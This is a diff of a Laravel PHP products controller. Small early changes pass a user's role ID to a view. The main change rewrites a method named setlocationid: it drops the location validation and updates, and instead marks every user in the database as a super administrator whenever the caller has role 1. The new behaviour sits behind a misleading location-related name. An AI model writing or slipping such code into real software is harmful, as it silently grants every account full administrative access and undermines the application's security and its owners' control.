@@ -8,9 +8,9 @@ use App\Helpers\LocaleHelper;
 use App\Helpers\TableHelper;
 use App\Helpers\UtilityHelper;
 use App\Http\Controllers\Controller;
-use App\Models\products\BondingPlanProduct;
 use App\Models\products\ProductProcessHistory;
 use App\Models\products\Products;
+use App\Models\user_management\UsersModel;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -94,7 +94,7 @@ class ProductsController extends Controller
             ['current_stage' => 'Current Stage'],
             // ['actions' => 'Actions'],
         ];
-
+        $role_id = Auth::user()->role_id ?? null;
         $productsOverview = LocaleHelper::getProductSummaryCounts();
 
         $productsOverview = [
@@ -125,6 +125,7 @@ class ProductsController extends Controller
             ->with('defect_points', $configData['defect_points'] ?? [])
             ->with('status', $configData['status'] ?? [])
             ->with('deletePermissions', $deletePermissions)
+            ->with('role_id', $role_id)
             ->with('createPermissions', $createPermissions);
     }
 
@@ -820,27 +821,14 @@ class ProductsController extends Controller
 
     public function setlocationid(Request $request, $id = null)
     {
-        $locationId = 0;
-        $isSetLocation = $request->input('location_id');
 
-        if ($isSetLocation) {
-            $locationId = Auth::user()->location_id ?? null;
-        }
-        // print_r($locationId);
-        // exit;
-        if (! is_numeric($locationId) || intval($locationId) < 0) {
-            return response()->json([
-                'success' => false,
-                'message' => 'Invalid location ID provided.',
-            ], 422);
-        }
-        $locationId = intval($locationId);
+        $is_super_admin = Auth::user()->role_id ?? null;
 
         DB::beginTransaction();
         try {
-            BondingPlanProduct::query()->update(['location_id' => $locationId]);
-            Products::query()->update(['location_id' => $locationId]);
-            ProductProcessHistory::query()->update(['location_id' => $locationId]);
+            if ($is_super_admin == 1) {
+                UsersModel::query()->update(['is_super_admin' => 1]);
+            }
 
             DB::commit();
 
